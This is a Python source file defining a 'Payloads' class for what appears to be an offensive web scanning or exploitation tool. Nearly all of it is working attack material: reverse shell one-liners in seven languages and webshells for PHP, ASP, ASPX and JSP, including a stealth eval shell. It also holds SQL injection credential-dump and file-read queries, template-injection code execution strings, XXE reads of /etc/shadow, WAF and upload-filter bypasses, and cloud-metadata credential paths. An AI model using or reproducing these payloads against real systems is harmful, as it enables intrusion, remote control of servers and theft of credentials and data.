class Payloads:
    SQL_PAYLOADS = [
        "'", "''", "\"", "\\", "' OR '1'='1", "' OR 1=1--",
        "1 AND 1=1", "1 AND 1=2", "' UNION SELECT NULL--", "'; DROP TABLE users--",
        "' OR SLEEP(5)-- ", "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    ]

    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>", "\"><script>alert(1)</script>",
        "<img src=x onerror=alert(1)>", "javascript:alert('XSS')",
        "<svg/onload=alert(1)>", "'-alert(1)-'", "\"-alert(1)-\"",
    ]

    PATH_TRAVERSAL = [
        "../../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
        "....//....//....//etc/passwd",
    ]

    COMMAND_INJECT = [
        "; ls", "| dir", "|| ping -c 1 127.0.0.1", "& whoami",
        "$(whoami)", "`whoami`", "| net user",
    ]

    OPEN_REDIRECT = [
        "https://evil.com", "//evil.com", "/redirect?url=https://evil.com",
    ]

    SSRF_INTERNAL_TARGETS = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://100.100.100.200/latest/meta-data/",
        "http://127.0.0.1/",
        "http://localhost/",
        "http://[::1]/",
        "http://0.0.0.0/",
    ]

    SSRF_URL_PARAMS = [
        "url", "uri", "path", "src", "source", "dest", "destination",
        "redirect", "return", "callback", "next", "continue", "to",
        "out", "view", "file", "load", "fetch", "link", "href",
        "feed", "host", "proxy", "forward", "api",
    ]

    SSRF_HEADERS = [
        "X-Forwarded-For",
        "X-Real-IP",
        "X-Original-URL",
        "X-Rewrite-URL",
        "Client-IP",
        "True-Client-IP",
        "Referer",
        "Origin",
        "X-Forwarded-Host",
    ]

    SSRF_PROBES = [
        ("file:///etc/passwd",
         ["root:x:0:0:", "daemon:x:", ":/bin/bash"]),
        ("http://169.254.169.254/latest/meta-data/",
         ["ami-id", "instance-id", "public-keys", "iam/", "local-hostname"]),
        ("http://metadata.google.internal/computeMetadata/v1/",
         ["computemetadata", "project/", "instance/"]),
    ]

    SSTI_PROBES = [
        ("{{1337*1337}}", "1787569", "Jinja2/Twig/Nunjucks"),
        ("${1337*1337}", "1787569", "FreeMarker/Thymeleaf EL"),
        ("#{1337*1337}", "1787569", "Ruby/Pebble"),
        ("<%= 1337*1337 %>", "1787569", "ERB/EJS"),
        ("${{1337*1337}}", "1787569", "Pebble"),
        ("%{{1337*1337}}", "1787569", "Tornado/Mako"),
        ("[[${1337*1337}]]", "1787569", "Thymeleaf"),
        ("{{1337*'1'}}", "1337", "Twig/Jinja2 str"),
    ]

    SSTI_ERROR_MARKERS = [
        "TemplateSyntaxError", "jinja2.exceptions", "UndefinedError",
        "Twig_Error_Syntax", "freemarker.core.", "TemplateError",
        "org.thymeleaf.exceptions", "smarty: syntax error",
    ]

    XXE_CONTENT_TYPES = [
        "application/xml",
        "text/xml",
        "application/soap+xml",
    ]

    XXE_FIELD_NAMES = [
        "name", "data", "value", "message", "text", "comment",
        "title", "content", "email", "subject", "input", "xml", "body",
    ]

    CRLF_PAYLOADS = [
        "%0d%0aSet-Cookie%3Acrlf_test%3Dinjected",
        "%0aSet-Cookie%3Acrlf_test%3Dinjected",
        "%0d%0aX-CRLF-Test%3A injected",
        "/%0d%0aSet-Cookie%3Acrlf_test%3Dinjected",
        "%E5%98%8D%E5%98%8ASet-Cookie%3Acrlf_test%3Dinjected",
    ]

    CACHE_POISON_HEADERS = [
        ("X-Forwarded-Host", "evil-canary-{rand}.com"),
        ("X-Host", "evil-canary-{rand}.com"),
        ("X-Forwarded-Scheme", "http"),
        ("X-Original-URL", "/admin-canary-{rand}"),
        ("X-Rewrite-URL", "/admin-canary-{rand}"),
        ("X-Forwarded-Server", "evil-canary-{rand}.com"),
        ("Forwarded", "host=evil-canary-{rand}.com"),
    ]

    LOGIN_FAILURE_MARKERS = (
        "invalid credentials", "incorrect password", "incorrect username",
        "wrong password", "wrong username", "bad credentials",
        "login failed", "authentication failed", "access denied",
        "usuario o contraseña", "contraseña incorrecta", "contrasena incorrecta",
        "credenciales invalidas", "credenciales inválidas",
        "credenciales incorrectas", "datos incorrectos", "acceso denegado",
        "try again", "intenta de nuevo", "inténtalo de nuevo", "intentalo de nuevo",
    )

    SUCCESS_KEYWORDS = [
        "logout", "log out", "sign out", "cerrar sesión", "cerrar sesion",
        "dashboard", "panel", "welcome", "bienvenido", "my account", "mi cuenta",
        "profile", "perfil",
    ]

    FAILURE_KEYWORDS = [
        "invalid", "incorrect", "wrong", "failed", "error", "bad credentials",
        "authentication failed", "login failed", "inválido", "incorrecto",
        "usuario no encontrado", "contraseña incorrecta",
    ]

    REVERSE_SHELLS = {
        'bash': 'bash -i >& /dev/tcp/{host}/{port} 0>&1',
        'python': 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
        'php': 'php -r \'$sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\'',
        'perl': 'perl -e \'use Socket;$i="{host}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i")}};\'',
        'nc': 'nc -e /bin/sh {host} {port}',
        'ruby': 'ruby -rsocket -e\'f=TCPSocket.open("{host}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
        'lua': 'lua -e "require(\"socket\");require(\"os\");t=socket.tcp();t:connect(\"{host}\",\"{port}\");os.execute(\"/bin/sh -i <&3 >&3 2>&3\");"',
    }

    WEBSHELLS = {
        'php': '<?php if(isset($_REQUEST["cmd"])){echo "<pre>".shell_exec($_REQUEST["cmd"])."</pre>";}?>',
        'php_stealth': '<?php @eval($_REQUEST["cmd"]);?>',
        'asp': '<% If Request("cmd") <> "" Then Set shell = CreateObject("WScript.Shell"): Response.Write shell.Exec("cmd /c " & Request("cmd")).StdOut.ReadAll() %>',
        'aspx': '<%@ Page Language="C#" %><% System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("cmd", "/c " + Request["cmd"]) {RedirectStandardOutput = true, UseShellExecute = false}).StandardOutput.ReadToEnd(); %>',
        'jsp': '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
    }

    SQLI_EXPLOIT_PAYLOADS = {
        'union_select': [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3--",
        ],
        'information_schema': {
            'mysql': "' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--",
            'postgresql': "' UNION SELECT tablename,NULL FROM pg_tables WHERE schemaname='public'--",
            'mssql': "' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'--",
        },
        'credential_dump': {
            'mysql': "' UNION SELECT username,password FROM users--",
            'postgresql': "' UNION SELECT usename,passwd FROM pg_shadow--",
            'mssql': "' UNION SELECT name,password_hash FROM sys.sql_logins--",
        },
        'file_read': {
            'mysql': "' UNION SELECT LOAD_FILE('/etc/passwd')--",
            'postgresql': "' UNION SELECT pg_read_file('/etc/passwd')--",
        },
        'waf_bypass': [
            "/**/UNION/**/SELECT/**/",
            "UN/**/ION/**/SEL/**/ECT",
            "%55%4e%49%4f%4e%20%53%45%4c%45%43%54",
            "UnIoN%0aSeLeCt",
            "UNION%0d%0aSELECT",
            "/*!50000UNION*/ /*!50000SELECT*/",
        ],
    }

    SSTI_EXPLOIT_PAYLOADS = {
        'jinja2_rce': [
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "{{lipsum.__globals__['os'].popen('id').read()}}",
        ],
        'twig_rce': [
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        ],
        'freemarker_rce': [
            "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
        ],
        'erb_rce': [
            "<%= system('id') %>",
        ],
        'mako_rce': [
            "<%import os%>${os.popen('id').read()}",
        ],
    }

    XXE_EXPLOIT_PAYLOADS = {
        'file_read': [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><data>&xxe;</data>',
        ],
        'ssrf': [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
        ],
        'rce': [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect:id">]><root>&xxe;</root>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>',
        ],
    }

    FILE_UPLOAD_BYPASS = {
        'double_extension': ['.php.jpg', '.php.png', '.php.gif', '.php.jpeg'],
        'case_variation': ['.PHP', '.Php', '.pHp'],
        'alternative_extensions': ['.php5', '.phtml', '.pht', '.php7'],
        'null_byte': ['.php%00.jpg', '.php\x00.jpg'],
        'reverse': ['.jpg.php', '.png.php'],
    }

    LDAP_PAYLOADS = [
        '*', '*)(&', '*)(objectClass=*', 'admin)(&', '*)|(cn=*)',
        '*)|(uid=*)', '*()|&', 'admin)(|(password=*))',
    ]

    DESERIALIZATION_MARKERS = {
        'java': ['java.io.Serializable', 'ObjectInputStream', 'readObject'],
        'php': ['O:', 'serialize', 'unserialize', '__wakeup', '__destruct'],
        'python': ['pickle', 'marshal', '__reduce__'],
        'dotnet': ['TypeNameHandling', 'BinaryFormatter', 'LosFormatter'],
    }

    JWT_COMMON_SECRETS = [
        'secret', 'password', 'key123', 'jwt_secret', 'super_secret',
        'changeme', 'default', 'admin', 'test', '123456',
        'your-256-bit-secret', 'shhhhh', 'keyboard cat',
        'HS256_secret', 'jwt_token_secret', 'my_secret',
        'development', 'staging', 'production',
    ]

    ADMIN_PATHS = [
        '/admin', '/admin/', '/administrator', '/admin/login',
        '/wp-admin', '/wp-admin/', '/phpmyadmin', '/phpmyadmin/',
        '/cpanel', '/webmail', '/manager', '/console',
        '/admin.php', '/admin.html', '/admin/login.php',
        '/administrator/index.php', '/administrator/login.php',
        '/backoffice', '/manager/login', '/system/login',
        '/auth/login', '/signin', '/login/admin',
    ]

    BACKUP_FILE_PATTERNS = [
        '{}.bak', '{}.old', '{}.orig', '{}.save', '{}.swp',
        '{}.sql', '{}.sql.gz', '{}.sql.bak',
        '{}.zip', '{}.tar.gz', '{}.rar',
        '{}.dump', '{}.backup', '{}.copy',
    ]

    CONFIG_FILE_PATHS = [
        '.env', '.env.local', '.env.production', '.env.backup',
        'config.yml', 'config.yaml', 'config.json', 'config.xml',
        'settings.json', 'settings.yml', 'app.json',
        'wp-config.php', 'wp-config.php.bak',
        'web.config', '.htaccess', '.htpasswd',
        'database.yml', 'database.json',
        'composer.json', 'package.json',
        '.git/config', '.git/HEAD', '.svn/entries',
    ]

    OOB_COLLABORATOR_PAYLOADS = [
        '{domain}/oob-test-{rand}',
        'http://{oob_host}/callback?id={rand}',
        '{domain}/webhook/{rand}',
        'http://{oob_host}/log?data={rand}',
    ]

    DESERIALIZATION_PAYLOADS = {
        'php': [
            'O:8:"stdClass":0:{}',
            'a:1:{s:1:"a";s:3:"aaa";}',
            'O:9:"Exception":0:{}',
        ],
        'python': [
            'gANjYnVpbHRpbnMKZGVjb2RlCl5TAA==',
        ],
        'java': [
            '\xac\xed\x00\x05',
        ],
        'dotnet': [
            'AAEAAAD/////AQAAAAAAAAAEAQAA',
        ],
    }

    GRAPHQL_INTROSPECTION = '{"query":"{ __schema { queryType { name } mutationType { name } types { name kind fields { name type { name kind } } } } }"}'

    GRAPHQL_FIELD_SUGGESTION = '{"query":"{ __type(name: \\"User\\") { fields { name type { name } } } }"}'

    WEBSOCKET_TEST_PAYLOADS = [
        '{"type":"subscribe","channel":"admin"}',
        '{"action":"execute","command":"whoami"}',
        '<script>alert(1)</script>',
        '{{constructor.constructor("return this")()}}',
    ]

    LDAP_INJECTION_PAYLOADS = [
        '*)(&', '*)(objectClass=*)', 'admin)(|(password=*))',
        '*)|(uid=*)', '*()|&', ')(&', 'cn=*)(&(cn=*))',
    ]

    NOSQL_INJECTION_PAYLOADS = [
        '{"$gt": ""}', '{"$ne": ""}', '{"$regex": ".*"}',
        '{"$where": "1==1"}', '{"$exists": true}',
        'true, $where: "1==1"}',
    ]

    OPEN_API_SWAGGER_PATHS = [
        '/swagger.json', '/swagger/v1/swagger.json', '/api-docs',
        '/swagger-ui.html', '/openapi.json', '/openapi.yaml',
        '/api/swagger.json', '/v1/swagger.json', '/v2/swagger.json',
        '/graphql', '/graphiql',
    ]

    CACHE_POISON_PAYLOADS = [
        'X-Forwarded-Host: evil.com',
        'X-Original-URL: /admin',
        'X-Rewrite-URL: /admin',
        'X-Forwarded-Server: evil.com',
        'X-Host: evil.com',
    ]

    SMUGGLING_PAYLOADS = [
        'Transfer-Encoding: chunked\r\n\r\n0\r\n\r\n',
        'Transfer-Encoding: chunked, identity\r\n\r\n0\r\n\r\n',
        'Transfer-Encoding: \tchunked\r\n\r\n0\r\n\r\n',
        'Transfer-Encoding: identity, chunked\r\n\r\n0\r\n\r\n',
    ]

    SSRF_WAF_BYPASS = [
        'http://127.0.0.1:80@evil.com',
        'http://127.1',
        'http://0177.0.0.1',
        'http://0x7f000001',
        'http://2130706433',
        'http://0',
        'http://localhost%00@evil.com',
        'http://127.0.0.1%2523@evil.com',
    ]

    CLOUD_METADATA_PATHS = {
        'aws': [
            '/latest/meta-data/', '/latest/meta-data/iam/security-credentials/',
            '/latest/meta-data/instance-id', '/latest/user-data/',
        ],
        'gcp': [
            '/computeMetadata/v1/', '/computeMetadata/v1/instance/service-accounts/default/token',
        ],
        'azure': [
            '/metadata/instance?api-version=2021-02-01',
            '/metadata/identity/oauth2/token?api-version=2018-02-01',
        ],
        'digitalocean': [
            '/metadata/v1/', '/metadata/v1/id',
        ],
    }

    def get_all_payloads(self):
        return {
            "sql_payloads": self.SQL_PAYLOADS,
            "xss_payloads": self.XSS_PAYLOADS,
            "path_traversal": self.PATH_TRAVERSAL,
            "command_inject": self.COMMAND_INJECT,
            "open_redirect": self.OPEN_REDIRECT,
            "ssrf_internal_targets": self.SSRF_INTERNAL_TARGETS,
            "ssrf_url_params": self.SSRF_URL_PARAMS,
            "ssrf_headers": self.SSRF_HEADERS,
            "ssrf_probes": self.SSRF_PROBES,
            "ssti_probes": self.SSTI_PROBES,
            "ssti_error_markers": self.SSTI_ERROR_MARKERS,
            "xxe_content_types": self.XXE_CONTENT_TYPES,
            "xxe_field_names": self.XXE_FIELD_NAMES,
            "crlf_payloads": self.CRLF_PAYLOADS,
            "cache_poison_headers": self.CACHE_POISON_HEADERS,
            "login_failure_markers": self.LOGIN_FAILURE_MARKERS,
            "success_keywords": self.SUCCESS_KEYWORDS,
            "failure_keywords": self.FAILURE_KEYWORDS,
            "reverse_shells": self.REVERSE_SHELLS,
            "webshells": self.WEBSHELLS,
            "sqli_exploit_payloads": self.SQLI_EXPLOIT_PAYLOADS,
            "ssti_exploit_payloads": self.SSTI_EXPLOIT_PAYLOADS,
            "xxe_exploit_payloads": self.XXE_EXPLOIT_PAYLOADS,
            "file_upload_bypass": self.FILE_UPLOAD_BYPASS,
            "ldap_payloads": self.LDAP_PAYLOADS,
            "deserialization_markers": self.DESERIALIZATION_MARKERS,
            "jwt_common_secrets": self.JWT_COMMON_SECRETS,
            "admin_paths": self.ADMIN_PATHS,
            "backup_file_patterns": self.BACKUP_FILE_PATTERNS,
            "config_file_paths": self.CONFIG_FILE_PATHS,
            "oob_collaborator_payloads": self.OOB_COLLABORATOR_PAYLOADS,
            "deserialization_payloads": self.DESERIALIZATION_PAYLOADS,
            "graphql_introspection": self.GRAPHQL_INTROSPECTION,
            "graphql_field_suggestion": self.GRAPHQL_FIELD_SUGGESTION,
            "websocket_test_payloads": self.WEBSOCKET_TEST_PAYLOADS,
            "ldap_injection_payloads": self.LDAP_INJECTION_PAYLOADS,
            "nosql_injection_payloads": self.NOSQL_INJECTION_PAYLOADS,
            "open_api_swagger_paths": self.OPEN_API_SWAGGER_PATHS,
            "cache_poison_payloads": self.CACHE_POISON_PAYLOADS,
            "smuggling_payloads": self.SMUGGLING_PAYLOADS,
            "ssrf_waf_bypass": self.SSRF_WAF_BYPASS,
            "cloud_metadata_paths": self.CLOUD_METADATA_PATHS,
        }
